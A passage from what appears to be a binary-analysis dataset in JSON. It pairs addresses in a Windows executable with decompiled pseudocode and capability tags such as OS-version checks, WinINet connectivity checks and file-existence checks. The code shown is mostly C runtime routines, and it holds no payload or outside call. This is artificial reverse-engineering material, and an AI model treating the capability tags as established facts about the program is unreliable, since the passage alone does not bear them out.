0x86;\n                            }\n                            else {\n                                if (*puVar6 != 0xc0000090) goto code_r0x0045685d;\n                                puVar5 = 0x81;\n                            }\ncode_r0x0045685a:\n                            ppuVar4[2] = puVar5;\n                        }\n                        else {\n                            if (*puVar6 == 0xc0000092) {\n                                puVar5 = 0x8a;\n                                goto code_r0x0045685a;\n                            }\n                            if (*puVar6 == 0xc0000093) {\n                                puVar5 = 0x85;\n                                goto code_r0x0045685a;\n                            }\n                            if (*puVar6 == 0xc00002b4) {\n                                puVar5 = 0x8e;\n                                goto code_r0x0045685a;\n                            }\n                            if (*puVar6 == 0xc00002b5) {\n                                puVar5 = 0x8d;\n                                goto code_r0x0045685a;\n                            }\n                        }\ncode_r0x0045685d:\n                        (**0x47b3f8)(8, puVar5);\n                        (*pcVar2)();\n                        ppuVar4[2] = puVar1;\n                    }\n                    else {\n                        puVar6[2] = 0;\n                        (**0x47b3f8)(puVar6[1]);\n                        (*pcVar2)();\n                    }\n                    ppuVar4[1] = puVar3;\n                }\n                return 0xffffffff;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 841
    },
    "004569fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.004569fd(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_10h;\n    uint arg_8h;\n    uint var_4h;\n    \n    fcn.00430e10(0x486950, 0x14);\n    if (*0x6ccc80 != '\\0') goto code_r0x00456ab1;\n    *0x6ccc78 = 1;\n    *(unaff_EBP + -4) = 0;\n    iVar1 = *0x6cade0;\n    if (**extraout_ECX == 0) {\n        *(unaff_EBP + -0x20) = *0x6cade0;\n        if (*0x6ccc7c != iVar1) {\n            pcVar2 = fcn.00456937(*0x6ccc7c);\n            (**0x47b3f8)(0, 0, 0);\n            (*pcVar2)();\n        }\n        arg_8h = 0x6ccfac;\ncode_r0x00456a68:\n        fcn.00458300(arg_8h);\n    }\n    else if (**extraout_ECX == 1) {\n        arg_8h = 0x6ccfb8;\n        goto code_r0x00456a68;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (**extraout_ECX == 0) {\n        fcn.0045897d(0x47b44c, 0x47b45c);\n    }\n    fcn.0045897d(0x47b460, 0x47b464);\n    if (*extraout_ECX[1] == 0) {\n        *0x6ccc80 = '\\x01';\n        *extraout_ECX[2] = 1;\n    }\ncode_r0x00456ab1:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return;\n}\n",
        "token_count": 504
    },
    "00456b28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456b28(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *puVar4;\n    uint *var_24h;\n    uint *var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47a3e0;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x6cade0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_10h == 0) {\n        cVar2 = fcn.00456bf9(uVar3);\n        if (cVar2 != '\\0') {\n            fcn.00456c54(arg_8h);\n        }\n    }\n    var_24h = &arg_ch;\n    var_dh = 0;\n    var_20h = &arg_10h;\n    var_1ch = &var_dh;\n    var_4h = 0;\n    var_14h = 2;\n    var_18h = 2;\n    puVar4 = &var_14h;\n    arg_ch_00 = &var_24h;\n    arg_8h_00 = &var_18h;\n    fcn.00456895(arg_8h_00, arg_ch_00);\n    if (arg_10h != 0) {\n        *in_FS_OFFSET = var_ch;\n        return;\n    }\n    fcn.00456bbf(arg_8h);\n    pcVar1 = swi(3);\n    (*pcVar1)(arg_8h_00, arg_ch_00, puVar4);\n    return;\n}\n",
        "token_count": 466
    },
    "00456bf9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00456bf9(void)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    \n    piVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar1 != NULL) && (*piVar1 == 0x5a4d)) && (piVar2 = *(piVar1 + 0x1e) + piVar1,  *piVar2 == 0x4550)) &&\n       ((piVar1 = 0x10b,  *(piVar2 + 6) == 0x10b && (0xe < piVar2[0x1d])))) {\n        return CONCAT31(1, piVar2[0x3a] != 0);\n    }\n    return piVar1 & 0xffffff00;\n}\n",
        "token_count": 188
    },
    "00456c3b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00456c3b(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.00460e47();\n    if (iVar1 != 1) {\n        uVar2 = fcn.00460c11();\n        return uVar2 & 0xffffff00 | 1 - (uVar2 != '\\0');\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "00456c54": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456c54(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t hLibModule;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x47a3fd;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x6cade0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    hLibModule = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(0, 0x47e550, &hLibModule, uVar1);\n    if (iVar2 != 0) {\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, \"CorExitProcess\");\n        if (pcVar3 != NULL) {\n            (**0x47b3f8)(arg_8h);\n            (*pcVar3)();\n        }\n    }\n    if (hLibModule != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 292
    },
    "00457554": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00457554(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *arg_ch;\n    char *arg_8h_00;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        iVar2 = 0;\n    }\n    else if ((arg_8h == 2) || (arg_8h == 1)) {\n        fcn.0046295b();\n        fcn.00462289(0, 0x6ccc88, 0x104);\n        *0x6cda94 = 0x6ccc88;\n        if ((*0x6cdaa8 == NULL) || (arg_8h_00 = *0x6cdaa8,  **0x6cdaa8 == '\\0')) {\n            arg_8h_00 = 0x6ccc88;\n        }\n        var_4h = 0;\n        var_ch = 0;\n        fcn.00457067(arg_8h_00, 0, 0, &var_4h, &var_ch);\n        arg_ch = fcn.00457505(var_4h, var_ch, 1);\n        if (arg_ch == NULL) {\n            puVar3 = fcn.0043bcb5();\n            iVar2 = 0xc;\n            *puVar3 = 0xc;\n        }\n        else {\n            fcn.00457067(arg_8h_00, arg_ch, arg_ch + var_4h, &var_4h, &var_ch);\n            if (arg_8h != 1) {\n                var_8h = NULL;\n                iVar2 = fcn.004620cd(arg_ch, &var_8h);\n                piVar1 = var_8h;\n                if (iVar2 == 0) {\n                    *0x6cda9c = 0;\n                    iVar2 = *var_8h;\n                    while (iVar2 != 0) {\n                        var_8h = var_8h + 1;\n                        *0x6cda9c = *0x6cda9c + 1;\n                        iVar2 = *var_8h;\n                    }\n                    var_8h = NULL;\n                    *0x6cdaa0 = piVar1;\n                    fcn.0045d185(0);\n                    iVar2 = 0;\n                }\n                else {\n                    fcn.0045d185(var_8h);\n                }\n                var_8h = NULL;\n                fcn.0045d185(arg_ch);\n                return iVar2;\n            }\n            *0x6cda9c = var_4h + -1;\n            iVar2 = 0;\n            *0x6cdaa0 = arg_ch;\n        }\n        fcn.0045d185(0);\n    }\n    else {\n        puVar3 = fcn.0043bcb5();\n        iVar2 = 0x16;\n        *puVar3 = 0x16;\n        fcn.0043bb3e();\n    }\n    return iVar2;\n}\n",
        "token_count": 722
    },
    "0045755f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045755f(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *arg_ch;\n    int16_t *arg_8h_00;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        iVar2 = 0;\n    }\n    else if ((arg_8h == 2) || (arg_8h == 1)) {\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, 0x6ccd90, 0x104);\n        *0x6cda98 = 0x6ccd90;\n        if ((*0x6cdaac == NULL) || (arg_8h_00 = *0x6cdaac,  **0x6cdaac == 0)) {\n            arg_8h_00 = 0x6ccd90;\n        }\n        var_4h = 0;\n        var_ch = 0;\n        fcn.004571db(arg_8h_00, 0, 0, &var_4h, &var_ch);\n        arg_ch = fcn.00457505(var_4h, var_ch, 2);\n        if (arg_ch == NULL) {\n            puVar3 = fcn.0043bcb5();\n            iVar2 = 0xc;\n            *puVar3 = 0xc;\n        }\n        else {\n            fcn.004571db(arg_8h_00, arg_ch, arg_ch + var_4h, &var_4h, &var_ch);\n            if (arg_8h != 1) {\n                var_8h = NULL;\n                iVar2 = fcn.004620d8(arg_ch, &var_8h);\n                piVar1 = var_8h;\n                if (iVar2 == 0) {\n                    *0x6cda9c = 0;\n                    iVar2 = *var_8h;\n                    while (iVar2 != 0) {\n                        var_8h = var_8h + 1;\n                        *0x6cda9c = *0x6cda9c + 1;\n                        iVar2 = *var_8h;\n                    }\n                    var_8h = NULL;\n                    *0x6cdaa4 = piVar1;\n                    fcn.0045d185(0);\n                    iVar2 = 0;\n                }\n                else {\n                    fcn.0045d185(var_8h);\n                }\n                var_8h = NULL;\n                fcn.0045d185(arg_ch);\n                return iVar2;\n            }\n            *0x6cda9c = var_4h + -1;\n            iVar2 = 0;\n            *0x6cdaa4 = arg_ch;\n        }\n        fcn.0045d185(0);\n    }\n    else {\n        puVar3 = fcn.0043bcb5();\n        iVar2 = 0x16;\n        *puVar3 = 0x16;\n        fcn.0043bb3e();\n    }\n    return iVar2;\n}\n",
        "token_count": 720
    },
    "0045761a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0045761a(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x6ccf9c != 0) {\n        return 0;\n    }\n    fcn.0046295b();\n    arg_8h = fcn.00463299();\n    if (arg_8h == 0) {\n        fcn.0045d185(0);\n        return 0xffffffff;\n    }\n    iVar1 = fcn.00457746(arg_8h);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = 0;\n        *0x6ccf9c = iVar1;\n        *0x6ccfa8 = iVar1;\n    }\n    fcn.0045d185(0);\n    fcn.0045d185(arg_8h);\n    return uVar2;\n}\n",
        "token_count": 215
    },
    "00457674": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00457674(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x6ccfa0 != 0) {\n        return 0;\n    }\n    arg_8h = fcn.00463339();\n    if (arg_8h == 0) {\n        fcn.0045d185(0);\n        return 0xffffffff;\n    }\n    iVar1 = fcn.00457828(arg_8h);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = 0;\n        *0x6ccfa0 = iVar1;\n        *0x6ccfa4 = iVar1;\n    }\n    fcn.0045d185(0);\n    fcn.0045d185(arg_8h);\n    return uVar2;\n}\n",
        "token_count": 203
    },
    "0045952f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045952f(int32_t arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t arg_14h;\n    uint uVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00431db0(arg_8h, 0, 0x1ca);\n    if (*arg_ch != 0) {\n        if ((*arg_ch != 0x2e) || (arg_ch[1] == 0)) {\n            var_4h = 0;\n            do {\n                arg_14h = fcn.00466687(arg_ch, 0x47e824);\n                if (arg_14h == 0) {\n                    return 0xffffffff;\n                }\n                iVar1 = arg_ch[arg_14h];\n                if (var_4h == 0) {\n                    if (0x3f < arg_14h) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = fcn.0043bf88(arg_8h, 0x40, arg_ch, arg_14h);\n                    if (iVar3 != 0) goto code_r0x00459661;\n                    if (iVar1 != 0x2e) goto code_r0x00459630;\n                    var_4h = 1;\n                }\n                else {\n                    if (var_4h == 1) {\n                        if (0x3f < arg_14h) {\n                            return 0xffffffff;\n                        }\n                        if (iVar1 == 0x5f) {\n                            return 0xffffffff;\n                        }\n                        uVar4 = 0x40;\n                        iVar3 = arg_8h + 0x80;\n                    }\n                    else {\n                        if (var_4h != 2) {\n                            return 0xffffffff;\n                        }\n                        if (0xf < arg_14h) {\n                            return 0xffffffff;\n                        }\n                        if ((iVar1 != 0) && (iVar1 != 0x2c)) {\n                            return 0xffffffff;\n                        }\n                        uVar4 = 0x10;\n                        iVar3 = arg_8h + 0x100;\n                    }\n                    iVar3 = fcn.0043bf88(iVar3, uVar4, arg_ch, arg_14h);\n                    if (iVar3 != 0) goto code_r0x00459661;\ncode_r0x00459630:\n                    if (iVar1 == 0x2c) {\n                        return 0;\n                    }\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                }\n                arg_ch = arg_ch + arg_14h + 1;\n                var_4h = var_4h + 1;\n            } while( true );\n        }\n        iVar3 = fcn.0043bf88(arg_8h + 0x100, 0x10, arg_ch + 1, 0xf);\n        if (iVar3 != 0) {\ncode_r0x00459661:\n            fcn.0043bb6b(0, 0, 0, 0, 0);\n            pcVar2 = swi(3);\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n        *(arg_8h + 0x11e) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 756
    },
    "0045a2da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2e8h\n\nvoid __cdecl fcn.0045a2da(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint16_t *puVar13;\n    uint *puVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint var_2e8h;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint32_t var_2c0h;\n    uint32_t var_2bch;\n    uint var_2b8h;\n    uint var_20ch;\n    uint var_10ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    iVar9 = fcn.0045ce63();\n    puVar10 = iVar9 + 0x278;\n    iVar11 = fcn.00459761(arg_10h, &var_10ch, 0x83, &var_2b8h, 0x55, &var_2c4h);\n    if (iVar11 != 0) {\n        iVar11 = (arg_ch + 2) * 0x10;\n        puVar14 = &var_10ch;\n        puVar13 = *(iVar11 + arg_8h);\n        do {\n            var_2bch = 0;\n            bVar16 = *puVar14 < *puVar13;\n            if (*puVar14 != *puVar13) {\ncode_r0x0045a3a9:\n                uVar15 = -bVar16 | 1;\n                goto code_r0x0045a3ae;\n            }\n            if (*puVar14 == 0) break;\n            uVar1 = *(puVar14 + 2);\n            bVar16 = uVar1 < puVar13[1];\n            var_2c0h = var_2c0h & 0xffff | uVar1 << 0x10;\n            if (uVar1 != puVar13[1]) goto code_r0x0045a3a9;\n            puVar14 = puVar14 + 1;\n            puVar13 = puVar13 + 2;\n        } while (uVar1 != 0);\n        uVar15 = 0;\ncode_r0x0045a3ae:\n        if (uVar15 != 0) {\n            puVar14 = &var_10ch;\n            do {\n                iVar2 = *puVar14;\n                puVar14 = puVar14 + 2;\n            } while (iVar2 != 0);\n            var_2c0h = (puVar14 - (&var_10ch + 2) >> 1) + 1;\n            puVar14 = fcn.0045d1bf(var_2c0h * 2 + 4);\n            if (puVar14 != NULL) {\n                iVar3 = *(iVar11 + arg_8h);\n                uVar4 = *(arg_8h + 0xa0 + arg_ch * 4);\n                var_2e8h = *(arg_8h + 8);\n                iVar12 = fcn.0043be56(puVar14 + 1, var_2c0h, &var_10ch);\n                if (iVar12 != 0) {\n                    fcn.0043bb6b(var_2bch, var_2bch, var_2bch, var_2bch, var_2bch);\n                    pcVar7 = swi(3);\n                    (*pcVar7)();\n                    return;\n                }\n                *(iVar11 + arg_8h) = puVar14 + 1;\n                if ((var_10ch != 0x43) || (uVar15 = var_2bch,  var_10ch._2_2_ != 0)) {\n                    uVar15 = fcn.004593ff(&var_2b8h);\n                }\n                *(arg_8h + 0xa0 + arg_ch * 4) = uVar15;\n                if (arg_ch == 2) {\n                    *(arg_8h + 8) = var_2c4h;\n                    uVar15 = var_2bch;\n                    var_2c4h = *(iVar9 + 0x29c);\n                    var_2c0h = *(iVar9 + 0x298);\n                    do {\n                        if (*(arg_8h + 8) == puVar10[uVar15 * 2]) {\n                            if (uVar15 != 0) {\n                                uVar6 = *(iVar9 + 0x27c + uVar15 * 8);\n                                *puVar10 = puVar10[uVar15 * 2];\n                                *(iVar9 + 0x27c) = uVar6;\n                                puVar10[uVar15 * 2] = var_2c0h;\n                                *(iVar9 + 0x27c + uVar15 * 8) = var_2c4h;\n                            }\n                            break;\n                        }\n                        uVar5 = puVar10[uVar15 * 2];\n                        uVar6 = *(iVar9 + 0x27c + uVar15 * 8);\n                        puVar10[uVar15 * 2] = var_2c0h;\n                        *(iVar9 + 0x27c + uVar15 * 8) = var_2c4h;\n                        uVar15 = uVar15 + 1;\n                        var_2c4h = uVar6;\n                        var_2c0h = uVar5;\n                    } while (uVar15 < 5);\n                    if (uVar15 == 5) {\n                        iVar12 = fcn.00466783(var_2bch, 1, 0x47e6c0, 0x7f, &var_20ch, *(arg_8h + 8), 1);\n                        uVar15 = var_2bch;\n                        if (iVar12 != 0) {\n                            do {\n                                puVar13 = &var_20ch + uVar15 * 2;\n                                *puVar13 = *puVar13 & 0x1ff;\n                                uVar15 = uVar15 + 1;\n                            } while (uVar15 < 0x7f);\n                            iVar12 = fcn.0047734e(&var_20ch, *0x6cae38, 0xfe);\n                            uVar15 = iVar12 == 0;\n                        }\n                        *(iVar9 + 0x27c) = uVar15;\n                        *puVar10 = *(arg_8h + 8);\n                    }\n                    *(arg_8h + 0x18) = *(iVar9 + 0x27c);\n                }\n                else if (arg_ch == 1) {\n                    *(arg_8h + 0x10) = var_2c4h;\n                }\n                else if (arg_ch == 5) {\n                    *(arg_8h + 0x14) = var_2c4h;\n                }\n                pcVar7 = *(arg_ch * 0xc + 0x47e748);\n                (**0x47b3f8)(arg_8h);\n                iVar9 = (*pcVar7)();\n                if (iVar9 == 0) {\n                    if (iVar3 != 0x6caf08) {\n                        piVar8 = *(arg_8h + 0x28 + arg_ch * 0x10);\n                        LOCK();\n                        iVar9 = *piVar8 + -1;\n                        *piVar8 = iVar9;\n                        if (iVar9 == 0) {\n                            fcn.0045d185(*(arg_8h + 0x28 + arg_ch * 0x10));\n                            fcn.0045d185(*(arg_8h + 0x24 + arg_ch * 0x10));\n                            fcn.0045d185(*(arg_8h + 0xa0 + arg_ch * 4));\n                            *(iVar11 + arg_8h) = var_2bch;\n                            *(arg_8h + 0xa0 + arg_ch * 4) = var_2bch;\n                        }\n                    }\n                    *puVar14 = 1;\n                    *(arg_8h + 0x28 + arg_ch * 0x10) = puVar14;\n                }\n                else {\n                    *(iVar11 + arg_8h) = iVar3;\n                    fcn.0045d185(*(arg_8h + 0xa0 + arg_ch * 4));\n                    *(arg_8h + 0xa0 + arg_ch * 4) = uVar4;\n                    fcn.0045d185(puVar14);\n                    *(arg_8h + 8) = var_2e8h;\n                }\n            }\n        }\n    }\n    fcn.004303e9(var_2e8h);\n    return;\n}\n",
        "token_count": 2124
    },
    "0045a6f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0045a6f4(uint arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *arg_ch_00;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_44h;\n    uint var_40h;\n    int16_t *var_3ch;\n    int32_t *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_1ch;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_3ch = arg_ch;\n    fcn.00431db0(arg_8h, 0, 0x1ca);\n    uVar7 = 0;\n    var_38h = &var_30h;\ncode_r0x0045a731:\n    do {\n        iVar4 = 0;\n        uVar8 = uVar7;\n        while( true ) {\n            if (3 < uVar8) goto code_r0x0045a8bf;\n            if (iVar4 == 2) {\n                piVar6 = var_3ch;\n                do {\n                    iVar1 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                } while (iVar1 != 0);\n                iVar5 = piVar6 - (var_3ch + 1) >> 1;\n            }\n            else {\n                iVar5 = fcn.00466687(var_3ch, 0x47e818);\n            }\n            uVar7 = uVar8 + 1;\n            piVar2 = var_38h + 3;\n            var_38h[-1] = var_3ch;\n            *var_38h = iVar5;\n            var_38h[1] = iVar4;\n            iVar1 = var_3ch[iVar5];\n            var_3ch = var_3ch + iVar5 + 1;\n            if (iVar1 == 0) goto code_r0x0045a7a4;\n            var_38h = piVar2;\n            if (iVar1 == 0x2d) goto code_r0x0045a731;\n            if (iVar1 != 0x2e) break;\n            iVar4 = 2;\n            uVar8 = uVar7;\n        }\n    } while (iVar1 == 0x5f);\ncode_r0x0045a7a4:\n    if (uVar8 == 0) {\n        fcn.0045a90d(arg_8h, &var_34h);\n    }\n    else {\n        if (uVar8 == 1) {\n            cVar3 = fcn.0045a90d(arg_8h, &var_34h);\n            if (((cVar3 == '\\0') || (cVar3 = fcn.0045aa3d(arg_8h, &var_28h),  cVar3 != '\\0')) ||\n               (cVar3 = fcn.0045a97f(arg_8h, &var_28h),  cVar3 != '\\0')) goto code_r0x0045a8bf;\n            arg_ch_00 = &var_28h;\n        }\n        else if (uVar8 == 2) {\n            cVar3 = fcn.0045a90d(arg_8h, &var_34h);\n            if ((cVar3 == '\\0') ||\n               (((cVar3 = fcn.0045aa3d(arg_8h, &var_28h),  cVar3 != '\\0' &&\n                 ((cVar3 = fcn.0045a97f(arg_8h, &var_1ch),  cVar3 != '\\0' ||\n                  (cVar3 = fcn.0045a8ce(arg_8h, &var_1ch),  cVar3 != '\\0')))) ||\n                (cVar3 = fcn.0045a97f(arg_8h, &var_28h),  cVar3 == '\\0')))) goto code_r0x0045a8bf;\n            arg_ch_00 = &var_1ch;\n        }\n        else {\n            if (((uVar8 != 3) || (cVar3 = fcn.0045a90d(arg_8h, &var_34h),  cVar3 == '\\0')) ||\n               ((cVar3 = fcn.0045aa3d(arg_8h, &var_28h),  cVar3 == '\\0' ||\n                (cVar3 = fcn.0045a97f(arg_8h, &var_1ch),  cVar3 == '\\0')))) goto code_r0x0045a8bf;\n            arg_ch_00 = &var_10h;\n        }\n        fcn.0045a8ce(arg_8h, arg_ch_00);\n    }\ncode_r0x0045a8bf:\n    fcn.004303e9(arg_8h);\n    return;\n}\n",
        "token_count": 1187
    },
    "0045a97f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045a97f(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uint32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if (arg_ch[2] == 0) {\n        if ((arg_ch[1] != 2) || (in_EAX = fcn.0045aaad(*arg_ch, 2),  in_EAX == '\\0')) {\n            if (arg_ch[1] != 3) goto code_r0x0045aa2b;\n            iVar3 = *arg_ch;\n            do {\n                uVar1 = *(iVar3 + uVar4 * 2);\n                arg_8h_00 = fcn.0046656a();\n                in_EAX = fcn.00455ad2(arg_8h_00, uVar1, 4);\n                if (in_EAX == 0) goto code_r0x0045aa2b;\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < 3);\n        }\n        iVar3 = fcn.0043bf88(arg_8h + 0x80, 0x40, *arg_ch, arg_ch[1]);\n        if (iVar3 == 0) {\n            iVar3 = fcn.0046667c(arg_8h + 0x120, 0x55, 0x47e814, 1);\n            if ((iVar3 == 0) && (iVar3 = fcn.0046667c(arg_8h + 0x120, 0x55, *arg_ch, arg_ch[1]),  iVar3 == 0)) {\n                return 1;\n            }\n        }\n        fcn.0043bb6b(0, 0, 0, 0, 0);\n        pcVar2 = swi(3);\n        uVar4 = (*pcVar2)();\n        return uVar4;\n    }\ncode_r0x0045aa2b:\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 502
    },
    "0045c29e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
